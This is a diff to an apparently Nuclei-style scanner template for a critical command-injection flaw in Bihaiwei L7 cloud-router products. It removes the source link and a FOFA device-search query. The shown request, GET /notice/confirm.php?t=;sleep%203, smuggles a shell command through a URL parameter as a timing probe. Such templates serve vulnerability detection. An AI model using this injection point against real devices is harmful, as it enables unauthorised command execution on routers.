@@ -3,12 +3,8 @@ info:
   name: 碧海威 L7多款产品confirm存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sqgg41ghal7x1og4'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sqgg41ghal7x1og4
-    fofa: product="碧海威科技-L7云路由"
 http:
 - raw:
   - 'GET /notice/confirm.php?t=;sleep%203 HTTP/1.1
